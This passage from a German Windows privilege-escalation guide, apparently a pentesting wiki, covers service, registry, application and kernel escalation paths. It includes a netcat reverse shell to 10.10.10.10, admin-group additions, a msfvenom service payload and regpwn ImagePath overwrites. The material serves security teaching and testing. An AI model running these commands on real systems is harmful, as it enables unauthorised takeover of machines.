accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen beliebigen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Hier kannst du accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er entweder deaktiviert ist oder ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn aktivieren mit_fold

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost von SSDPSRV abhängt, damit er funktioniert (für XP SP1).**

**Ein weiterer Workaround für dieses Problem ist die Ausführung von:**

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann dessen ausführbare Binärdatei geändert werden. So ändern und starten Sie **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Rechte eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Dienstkonfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet auch die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit geringen Berechtigungen die Dienst-EXE oder ihren übergeordneten Ordner ändern können**, lässt sich der Dienst häufig kapern, indem man **die Binärdatei ersetzt und den Dienst neu startet**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien ermitteln und deine Berechtigungen mit **icacls** überprüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Suche nach gefährlichen ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere nach **`(F)`**, **`(M)`** oder **`(W)`** für die ausführbare Dienstdatei oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Ablauf für den Missbrauch ist:<sup>[[27]](#references)</sup>

1. Ermittle das Dienstkonto und den Pfad zur ausführbaren Datei mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienst-Binärdatei durch einen payload oder eine gültige schädliche Dienst-Binärdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / service trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfen Sie, ob er beim Booten automatisch gestartet wird, eine Fehleraktion zum erneuten Starten konfiguriert hat oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienst-Registry-Einträge

Sie sollten prüfen, ob Sie Registry-Einträge eines Dienstes ändern können.\
Sie können Ihre **Berechtigungen** für die **Registry** eines Dienstes wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfen Sie, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry verfügen. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Berechtigungen für einen Registry-Schlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt. Für eine Rechteausweitung sind außerdem ein verwendbares Dienstkonfigurationsfeld, eine Möglichkeit, den Dienst auszulösen, und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So ändern Sie den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Werteschreibvorgänge (ATConfig)

Einige Windows-Barrierefreiheitsfeatures erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine **symbolische Registry-Link-Race-Condition** kann diesen privilegierten Schreibvorgang auf einen **beliebigen HKLM-Pfad** umleiten und so einen primitiven Mechanismus für beliebige HKLM-**Werteschreibvorgänge** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Schlüsselpfade (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfeatures auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird während der Anmeldung oder beim Wechsel zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse die Kopie auf den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne das Race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE übergehen:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt während des Race die Arbeitsstation**.

Beispieltools (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory-Berechtigungen

Wenn du diese Berechtigung für eine Registry hast, bedeutet das, dass du **aus dieser Registry Unterschlüssel erstellen kannst**. Bei Windows-Diensten reicht das **aus, um beliebigen Code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Variante auszuführen, die vor einem Leerzeichen endet.

Bei dem Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle Dienstpfade auf, die nicht in Anführungszeichen stehen, mit Ausnahme derer, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können** diese Schwachstelle mit metasploit **erkennen und ausnutzen**: `exploit/windows/local/trusted\_service\_path` Sie können manuell mit metasploit eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Rechteausweitung möglich. Weitere Informationen finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skriptziele geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das in den **Aktionsargumenten** angegebene Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts. Variablen, Bedingungen und verkettete Shell-Befehle müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der aufrufende Benutzer schreiben kann, ist nur dann ein Ansatzpunkt für die Ausführung im Kontext eines anderen Kontos, wenn sich der konfigurierte Aufgabenprinzipal vom aufrufenden Benutzer unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripten relevant sein; ein früheres `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Prüfen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor Sie eine Rechteausweitung behaupten. Die Bestandsaufnahme sollte das Skript weder verändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt diese über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShells [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Unterstützung von Streams durch das Dateisystem, ob der Stream verwendbare Zugangsdaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung dienen. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben des geplanten Windows Driver Kit-Hilfsprogramms

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das in seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verarbeiten kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingabedateien in Befehlsausführung im Kontext dieses Kontos umwandeln – selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Stellen Sie fest, welcher privilegierte Prozess die Dateien verarbeitet, und prüfen Sie, ob **beide** zusätzlichen Dateien erstellt oder geändert werden können. Das Hilfsprogramm allein zu finden, reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren Aktionseigenschaft [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) und die ACLs der beiden Pfade zu den zusätzlichen Dateien. Wenn für die Aufgabe kein Arbeitsverzeichnis angegeben ist, ist das Verzeichnis der ausführbaren Datei lediglich ein Ansatzpunkt, den es zu überprüfen gilt, kein Beleg dafür, wo die Aufgabe ihre Eingabedateien liest. Auch die Voraussetzung für die Projekt-Arbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenprinzipal, statt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Berechtigungen erweitern) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Reparaturpfad des Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` schrieben und anschließend eine bereits vorhandene schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Anbieter hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfe den vollständigen installierten Patchstand und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine reine Versionsangabe wie `2.1` belegt keine Anfälligkeit. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus bis einschließlich Build 6210; der Anbieter hat das Problem in Build 6211 behoben. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für ein installiertes Produkt oder ein Dienstpfad ist daher ein Hinweis, aber kein Nachweis für eine Schwachstelle: Bestätige den genauen Build, den SAML-Konfigurationsverlauf, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM erfordert eine Instanz, die als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Beleg für nutzbare Zugangsdaten oder diese SAML-Schwachstelle. Halte Pfad und Zugriffsrechte fest, ohne die Datei bei einer routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheide auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Build-Weg bieten; bestätige jedoch, dass er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents, und auf gespeicherte Zugangsdaten kann nur zugegriffen werden, wenn der Job deren Geltungsbereich nutzen darf. Prüfe separat den Zugriff auf die Metadaten unter `JENKINS_HOME`: Jenkins speichert Zugangsdaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Speicherung von Secrets](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr Vorhandensein allein gibt kein Passwort preis; bestätige **Lesezugriff auf die erforderlichen Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Secrets in gemeinsam genutzten Ausgaben auszugeben. Hat dieses Konto Schreibrechte auf `scriptPath` eines AD-Benutzerobjekts, bestätige einen beschreibbaren Skriptpfad und einen tatsächlichen Anmelde- oder geplanten Prozess, der als Zielbenutzer läuft, bevor du dies als kontoübergreifende Ausführung einstufst. Eine weitergehende Gruppensteuerung erfordert eine separate Überprüfung der effektiven AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheide bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Bestätige die konkrete Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agents, bevor du einen kontoübergreifenden Wechsel oder einen Wechsel zu SYSTEM behauptest. Ein installierter Agent, eine Projektrolle oder Schreibzugriff auf ein Repository sind für sich genommen nur Hinweise; prüfe Berechtigungen und lokale Dienstmetadaten, ohne während einer passiven Enumeration einen Build zu starten.

#### Anmeldeinformationen von Microsoft Entra Connect Sync

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Die Connector-Anmeldeinformationen werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe mit scheinbar lokalen Administratorrechten oder alleiniger Datenbankzugriff belegen weder entschlüsselbare Anmeldeinformationen noch eine Rechteausweitung in der Domäne. Prüfe separat die tatsächlichen Datenbank-Leserechte, den Zugriff des Dienstkontos auf Schlüssel, die Installations- und SQL-Struktur, die konfigurierte Connector-Identität und deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Secrets abgefragt oder ausgegeben werden.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und in einem privilegierteren Druckprozess laden. Prüfe die ACLs des konkreten Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, selbst wenn die WMI-Enumeration von Druckern verweigert wird. Beim [Ricoh-Druckertreiberproblem CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Veröffentlichung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Hinweis: Prüfe den effektiven Schreibzugriff nach Anwendung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei mit einer privilegierten Identität lädt, und ob der Anbieter die Installation mit einem aktualisierten Treiber oder Sicherheitsprogramm behoben hat. Leite eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei so ändern kannst, dass du eine spezielle Datei lesen kannst, oder ob du eine Binärdatei ändern kannst, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/-Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable/Kopierinstallation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (einschließlich über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du eine Registry oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Treibern von Drittanbietern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Read/Write-Primitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Privilegien erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Anleitung findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandtes Material zur Windows-Kernel-Exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, lässt sich das Zeitfenster durch absichtliches Verlangsamen der Suche (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnissen) von Mikrosekunden auf mehrere zehn Mikrosekunden ausdehnen:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAFs in Cancel-Safe Queues, Offenlegung von Paged-Pool-Daten und I/O-Ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer cancel-sicheren Queue**, die eine Anfrage/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene Paged-Pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgs-Pfad mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruch-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgs-Pfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor er die CBDQ/CSQ-Sperre freigibt, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Hole das freigegebene Queue-Objekt zurück**, indem du eine gleich große, vom Angreifer kontrollierte Paged-Pool-Allokation verwendest. `NPFS` Data Queue Entries eignen sich, da sich Payload und Größe kontrollieren lassen und du sie später mit Pipe-Read-/Peek-Operationen untersuchen kannst. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, sodass der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listenanfang zu enden.
- **Werte einen vorhersagbaren Schreibzugriff auf**: Wenn der gefälschte Request einen verschachtelten Kontextzeiger umleitet, der für Buchhaltungsschreibzugriffe verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Schreibzugriff. Ziele in diesem Fall auf das **length-/size-Feld** eines gesprühten Pool-Objekts statt auf einen abschließenden Code-/Datenzeiger und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Read aus dem Paged Pool** ermöglicht.
- **Muster für Race-fähige Offenlegung**: Jeder Systemaufruf mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch viele Listen-/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen), da der längere Kopiervorgang das Zeitfenster für das Ersetzen vergrößert, ohne zwangsläufig einen Systemabsturz zu verursachen.
